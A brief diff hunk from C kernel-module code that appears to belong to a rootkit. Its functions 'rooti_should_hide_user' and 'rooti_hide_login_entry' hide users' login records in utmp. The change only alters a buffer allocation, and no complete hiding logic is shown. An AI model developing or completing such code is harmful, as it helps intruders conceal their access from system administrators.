@@ -61,7 +61,7 @@ static bool rooti_should_hide_user(char *username)
 
 int rooti_hide_login_entry(char *user_buf, size_t count)
 {
-    char *kernel_buf = kmalloc(count, GFP_KERNEL);
+    char *kernel_buf;
     struct utmp *utmp_buf;
     int ret;
 
